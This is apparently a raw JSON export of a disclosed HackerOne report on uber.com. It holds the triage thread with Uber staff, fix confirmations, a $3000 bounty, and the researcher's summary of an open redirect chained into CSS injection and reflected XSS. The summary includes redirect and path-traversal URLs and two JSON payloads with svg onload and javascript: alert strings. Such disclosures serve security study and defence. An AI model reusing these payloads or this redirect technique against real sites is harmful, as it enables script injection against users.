dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026X-Amz-Signature=27c12dca33a1e2b23fb57810e505f22d799a6b4a44d6a4d33252b6ca73ba1e35"},{"id":83901,"filename":"XSS4.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/083/901/45b764eae6f0f984abf0068259ae90a2aae026ba/XSS4.png?response-content-disposition=attachment%3B%20filename%3D%22XSS4.png%22%3B%20filename%2A%3DUTF-8%27%27XSS4.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042241Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026X-Amz-Signature=944f0ef32b1afce4b27e3bfe9234e4bfc93357d92d416d3ccfe527815f39a5da"}],"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":895165,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @mdv! We believe the XSS vector has been mitigated. Can you test again and confirm the fix? We are still in the process of rolling out the fix for the open redirect. Thanks!","markdown_message":"\u003cp\u003eHello \u003ca href=\"/mdv\"\u003e@mdv\u003c/a\u003e! We believe the XSS vector has been mitigated. Can you test again and confirm the fix? We are still in the process of rolling out the fix for the open redirect. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-07T23:37:29.482Z","updated_at":"2016-04-07T23:37:29.482Z","actor":{"username":"zacmuber","cleared":false,"url":"/zacmuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/061/637/8ae1b2449b13a6b336fb1e84fed117006320998f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":895229,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@zacmuber I don't believe the XSS fix has been deployed yet as the XSS still repros, but a fix for both the open redirect and the XSS has been committed. \n\n@mdv The fix will probably be live tomorrow, I'll update this report once it's out.","markdown_message":"\u003cp\u003e\u003ca href=\"/zacmuber\"\u003e@zacmuber\u003c/a\u003e I don\u0026#39;t believe the XSS fix has been deployed yet as the XSS still repros, but a fix for both the open redirect and the XSS has been committed. \u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/mdv\"\u003e@mdv\u003c/a\u003e The fix will probably be live tomorrow, I\u0026#39;ll update this report once it\u0026#39;s out.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-08T00:48:00.859Z","updated_at":"2016-04-08T00:48:14.535Z","actor":{"username":"jmilne-uber","cleared":false,"url":"/jmilne-uber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/902/2b5f98bcf2caa1f7275fda76934a396babd077a5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":895476,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@zacmuber @jmilne-uber\nThanks for info! XSS is not fixed.","markdown_message":"\u003cp\u003e\u003ca href=\"/zacmuber\"\u003e@zacmuber\u003c/a\u003e \u003ca href=\"/jmilne-uber\"\u003e@jmilne-uber\u003c/a\u003e\u003cbr\u003e\nThanks for info! XSS is not fixed.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-08T08:04:29.134Z","updated_at":"2016-04-08T08:04:29.134Z","actor":{"username":"mdv","cleared":false,"url":"/mdv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":901921,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I read\n\n\u003eOpen redirects - 99% of open redirect issues have low security impact. For the rare cases, like stealing oauth tokens, we do still want to hear about them\n\nIn fact, XSS vulnerabilities is the main danger, and Open Redirect refers to the 99% who have low security impact. This Open Redirect is still valid?\n","markdown_message":"\u003cp\u003eI read\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eOpen redirects - 99% of open redirect issues have low security impact. For the rare cases, like stealing oauth tokens, we do still want to hear about them\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eIn fact, XSS vulnerabilities is the main danger, and Open Redirect refers to the 99% who have low security impact. This Open Redirect is still valid?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-12T18:52:14.709Z","updated_at":"2016-04-12T18:52:14.709Z","actor":{"username":"mdv","cleared":false,"url":"/mdv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":901941,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @mdv,\n\nWe honor what was in scope at the time of report submission, so we would still consider it valid. Further, you were able to work it into a reflected XSS and a content spoofing vuln that gave you an unusually high degree of control over the page, so we would consider this valid even now.\n\nWe've just pushed a fix that should resolve the open redirect, can you verify that this is fixed? Note that we were sending 301 redirects with long `max-age`s so your old test URLs might still be cached in your browser.\n\nCheers,\nJordan","markdown_message":"\u003cp\u003eHey \u003ca href=\"/mdv\"\u003e@mdv\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eWe honor what was in scope at the time of report submission, so we would still consider it valid. Further, you were able to work it into a reflected XSS and a content spoofing vuln that gave you an unusually high degree of control over the page, so we would consider this valid even now.\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;ve just pushed a fix that should resolve the open redirect, can you verify that this is fixed? Note that we were sending 301 redirects with long \u003ccode\u003emax-age\u003c/code\u003es so your old test URLs might still be cached in your browser.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nJordan\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-12T19:01:50.715Z","updated_at":"2016-04-12T19:01:50.715Z","actor":{"username":"jmilne-uber","cleared":false,"url":"/jmilne-uber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/902/2b5f98bcf2caa1f7275fda76934a396babd077a5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":901961,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I verify, Open Redirect is fixed.","markdown_message":"\u003cp\u003eI verify, Open Redirect is fixed.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-12T19:17:32.463Z","updated_at":"2016-04-12T19:17:32.463Z","actor":{"username":"mdv","cleared":false,"url":"/mdv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":901996,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"But I can still control the sending AJAX requests so: https://www.uber.com/cities/%252e%252e%2f%252e%252e%2fexample_page/\nPage try uploading a content from this page: https://www.uber.com/example_page That is risk of running into the same problem over and over again.","markdown_message":"\u003cp\u003eBut I can still control the sending AJAX requests so: \u003ca title=\"https://www.uber.com/cities/%252e%252e%2f%252e%252e%2fexample_page/\" href=\"/redirect?url=https%3A%2F%2Fwww.uber.com%2Fcities%2F%25252e%25252e%252f%25252e%25252e%252fexample_page%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.uber.com/cities/%252e%252e%2f%252e%252e%2fexample_page/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nPage try uploading a content from this page: \u003ca title=\"https://www.uber.com/example_page\" href=\"/redirect?url=https%3A%2F%2Fwww.uber.com%2Fexample_page\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.uber.com/example_page\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e That is risk of running into the same problem over and over again.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-12T19:30:41.647Z","updated_at":"2016-04-12T19:30:41.647Z","actor":{"username":"mdv","cleared":false,"url":"/mdv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":902028,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yep, we have an open task for fixing that as well.","markdown_message":"\u003cp\u003eYep, we have an open task for fixing that as well.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-12T19:55:54.201Z","updated_at":"2016-04-12T19:55:54.201Z","actor":{"username":"jmilne-uber","cleared":false,"url":"/jmilne-uber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/902/2b5f98bcf2caa1f7275fda76934a396babd077a5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":902030,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Awesome, I'm going to make this as resolved then. Thanks again for the report!","markdown_message":"\u003cp\u003eAwesome, I\u0026#39;m going to make this as resolved then. Thanks again for the report!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-12T19:56:15.661Z","updated_at":"2016-04-12T19:56:15.661Z","actor":{"username":"jmilne-uber","cleared":false,"url":"/jmilne-uber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/902/2b5f98bcf2caa1f7275fda76934a396babd077a5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"mdv","url":"/mdv"},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":902075,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great! Thanks.","markdown_message":"\u003cp\u003eGreat! Thanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-12T20:18:57.832Z","updated_at":"2016-04-12T20:18:57.832Z","actor":{"username":"mdv","cleared":false,"url":"/mdv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":902140,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-04-12T20:43:44.044Z","updated_at":"2016-04-12T20:43:44.044Z","additional_data":{"old_title":"Unvalidated / Open Redirect in uber.com","new_title":"Reflected XSS via Unvalidated / Open Redirect in uber.com"},"actor":{"username":"jmilne-uber","cleared":false,"url":"/jmilne-uber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/902/2b5f98bcf2caa1f7275fda76934a396babd077a5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":903048,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-04-13T08:57:19.320Z","updated_at":"2016-04-13T08:57:19.320Z","first_to_agree":true,"actor":{"username":"mdv","cleared":false,"url":"/mdv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":903075,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If you think that this issue must stay private - not a problem.","markdown_message":"\u003cp\u003eIf you think that this issue must stay private - not a problem.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-13T09:10:32.145Z","updated_at":"2016-04-13T09:10:32.145Z","actor":{"username":"mdv","cleared":false,"url":"/mdv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":903079,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @mdv!\n\nBased on the issues we were able to fix thanks to your report, we've decided to award you $3000!\n\nThis is a particularly interesting way of abusing an open redirect, very clever! Note that someone else had reported the first open redirect -\u003e XSS chain you mentioned, but your second chain was indeed novel. The \"XSS\" marquee in your stylesheet injection PoC was also a nice touch.\n\nThank you again for your report, I hope to see more reports from you in the future!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/mdv\"\u003e@mdv\u003c/a\u003e!\u003c/p\u003e\n\n\u003cp\u003eBased on the issues we were able to fix thanks to your report, we\u0026#39;ve decided to award you $3000!\u003c/p\u003e\n\n\u003cp\u003eThis is a particularly interesting way of abusing an open redirect, very clever! Note that someone else had reported the first open redirect -\u0026gt; XSS chain you mentioned, but your second chain was indeed novel. The \u0026quot;XSS\u0026quot; marquee in your stylesheet injection PoC was also a nice touch.\u003c/p\u003e\n\n\u003cp\u003eThank you again for your report, I hope to see more reports from you in the future!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-13T09:12:23.555Z","updated_at":"2016-04-13T09:12:23.555Z","actor":{"url":"/uber","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Uber"}},"bounty_amount":"3000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"uber","collaborator":{"username":"mdv","url":"/mdv"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":903126,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks! You agree to disclose this report publicly?","markdown_message":"\u003cp\u003eThanks! You agree to disclose this report publicly?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-13T09:48:00.088Z","updated_at":"2016-04-13T09:48:00.088Z","actor":{"username":"mdv","cleared":false,"url":"/mdv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":904009,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We're holding a meeting soonish to review reports marked pending disclosure, but we'd like to get a mitigation in that endpoint that enabled XSS via open redirect before we disclose.\n\nCheers,\nJordan","markdown_message":"\u003cp\u003eWe\u0026#39;re holding a meeting soonish to review reports marked pending disclosure, but we\u0026#39;d like to get a mitigation in that endpoint that enabled XSS via open redirect before we disclose.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nJordan\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-13T18:28:30.106Z","updated_at":"2016-04-13T18:28:30.106Z","actor":{"username":"jmilne-uber","cleared":false,"url":"/jmilne-uber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/902/2b5f98bcf2caa1f7275fda76934a396babd077a5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":904035,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok, thanks again.","markdown_message":"\u003cp\u003eOk, thanks again.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-13T18:38:17.818Z","updated_at":"2016-04-13T18:38:17.818Z","actor":{"username":"mdv","cleared":false,"url":"/mdv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":947953,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hey @mdv, publicly disclosing this now - thanks for the report!","markdown_message":"\u003cp\u003eHey \u003ca href=\"/mdv\"\u003e@mdv\u003c/a\u003e, publicly disclosing this now - thanks for the report!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-09T22:29:33.245Z","updated_at":"2016-05-09T22:29:33.245Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":947954,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-05-09T22:29:33.331Z","updated_at":"2016-05-09T22:29:33.331Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":1899,"category":"researcher","content":"This report demonstrate as much usual Open Redirect can be dangerous.\n### Open Redirect\nOpen Redirect was reproduced from this URL: [uber.com/en//example.com/](https://www.uber.com/en//example.com/)\nResponse:\n{F81107}\n### CSS injection\nThis vulnerability was reproduced via parameter `theme` from URL [uber.com/?theme=../en//example.com/css-code.css%23](https://www.uber.com/?theme=../en//example.com/css-code.css%23) as follow:\n```\n\u003clink rel=\"stylesheet\" id=\"theme-css\" href=\"https://uber.com/stylesheets/../en//example.com/css-code.css#.css\"\u003e\n```\nBrowser try to load CSS code from: [example.com/css-code.css](https://example.com/css-code.css)\nTo fix @uber added whitelisting the theme names.\n### Reflected Cross-Site Scripting\nThis vulnerability was produced via insufficient filtration API requests.\n\u003eExample URL to controlling API request: [uber.com/careers/list/-CONTROLLED-/](https://www.uber.com/careers/list/-CONTROLLED-/)\nBrowser try to load JSON content from: [uber.com/api/jobs/-CONTROLLED-](https://www.uber.com/api/jobs/-CONTROLLED-)\n\u003e\nSending API requests to another domain: [uber.com/careers/list/..%2f..%2fen%2f%2fexample.com%2ffile.json/](https://www.uber.com/careers/list/..%2f..%2fen%2f%2fexample.com%2ffile.json/)\nBrowser try to load JSON content from: \n[uber.com/en//example.com/file.json](https://uber.com/en//example.com/file.json) \u003e\u003e\u003e [example.com/file.json](https://example.com/file.json)\n\nSo, on controlled me domain I placed JSON file with this content:\n```\n{  \n   \"id\":\"9999\",\n   \"title\":\"XSS on Uber.com\",\n   \"overview\":\"\u003csvg onload=\\\"alert('XSS on '+ document.domain)\\\"\u003e\",\n   \"responsibilities\":null,\n   \"qualifications\":null,\n   \"lastUpdated\":\"2016-01-16 06:29 AM\",\n   \"formattedTeam\":\"xss\",\n   \"team\":\"xss\",\n   \"subTeam\":\"xss\",\n   \"formattedLocation\":\"xss\",\n   \"slugs\":{  \n      \"team\":\"xss\",\n      \"subTeam\":\"xss\",\n      \"city\":\"xss\",\n      \"country\":\"xss\"\n   },\n   \"city\":\"xss\",\n   \"country\":\"xss\",\n   \"jobUrl\":\"javascript:alert('XSS on '+ document.domain)\",\n   \"normalizedTitle\":\"xss\",\n   \"normalizedContent\":\"xss\"\n}\n```\nand get unusually high degree of control over the page.\nThen I found a similar XSS vector on [uber.com/cities/%252e%252e%2f%252e%252e%2fen%2f%2fexample.com%2ffile.json/](https://www.uber.com/cities/%252e%252e%2f%252e%252e%2fen%2f%2fexample.com%2ffile.json/).\nBrowser try to load JSON content from: [example.com/file.json](https://example.com/file.json)\nVulnerable JSON  for [uber.com/cities/-CONTROLLED-/](https://www.uber.com/cities/-CONTROLLED-/):\n```\n{  \n   \"products\":[  \n      {  \n         \"productDisplayType\":\"uberx\",\n         \"fare\":{  \n            \"safeRideFee\":\"USD9999.99\",\n            \"perMinute\":\"USD9999.99\",\n            \"minimum\":\"USD9999.99\",\n            \"cancellation\":\"USD9999.99\",\n            \"fareType\":\"time_plus_distance\",\n            \"base\":\"USD9999.99\",\n            \"isDistanceUnitMetric\":false,\n            \"perDistanceUnit\":\"USD9999.99\",\n            \"additionalFees\":[  \n\n            ]\n         },\n         \"displayName\":\"uberX\",\n         \"tagline\":\"XSS\",\n         \"taxiFareInfo\":false,\n         \"finePrint\":[  \n            \"XSS\"\n         ]\n      },\n      {  \n         \"productDisplayType\":\"uberxl\",\n         \"fare\":{  \n            \"safeRideFee\":\"USD9999.99\",\n            \"perMinute\":\"USD9999.99\",\n            \"minimum\":\"USD9999.99\",\n            \"cancellation\":\"USD9999.99\",\n            \"fareType\":\"time_plus_distance\",\n            \"base\":\"USD9999.99\",\n            \"isDistanceUnitMetric\":false,\n            \"perDistanceUnit\":\"USD9999.99\",\n            \"additionalFees\":[  \n\n            ]\n         },\n         \"displayName\":\"uberXL\",\n         \"tagline\":\"XSS\",\n         \"taxiFareInfo\":false,\n         \"finePrint\":[  \n            \"XSS\"\n         ]\n      }\n   ],\n   \"flatRates\":[  \n\n   ],\n   \"id\":9999,\n   \"cityId\":9999,\n   \"flatRateDisplayNames\":[  \n\n   ],\n   \"geoJson\":null,\n   \"geoPoint\":{  \n      \"latitude\":33.951252,\n      \"longitude\":-83.382943\n   },\n   \"slug\":\"xss\",\n   \"twitterHandle\":null,\n   \"theme\":{  \n      \"name\":\"united_states\",\n      \"ctaColor\":\"#57AD57\",\n      \"patternColor\":\"#4DB5D9\",\n      \"patternColorBackground\":\"#A6DAEC\"\n   },\n   \"rideContent\":\"XSS\",\n   \"driveContent\":\"XSS\",\n   \"impactContent\":\"XSS\",\n   \"name\":\"\u003cmarquee\u003eXSS\u003c/marquee\u003e\u003csvg onload=\\\"alert('XSS on '+ document.domain)\\\"\u003e\",\n   \"pageTitle\":\"XSS\",\n   \"pageDescription\":\"XSS\",\n   \"productLegalNotice\":null,\n   \"pageConfiguration\":{  \n\n   }\n}\n```","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eThis report demonstrate as much usual Open Redirect can be dangerous.\u003c/p\u003e\n\n\u003ch3 id=\"open-redirect\"\u003eOpen Redirect\u003c/h3\u003e\n\n\u003cp\u003eOpen Redirect was reproduced from this URL: \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.uber.com%2Fen%2F%2Fexample.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003euber.com/en//example.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nResponse:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Response.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/081/107/834faa37742f57ab1afaf12dad30d67a30e7ec1f/Response.png?response-content-disposition=attachment%3B%20filename%3D%22Response.png%22%3B%20filename%2A%3DUTF-8%27%27Response.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T042241Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1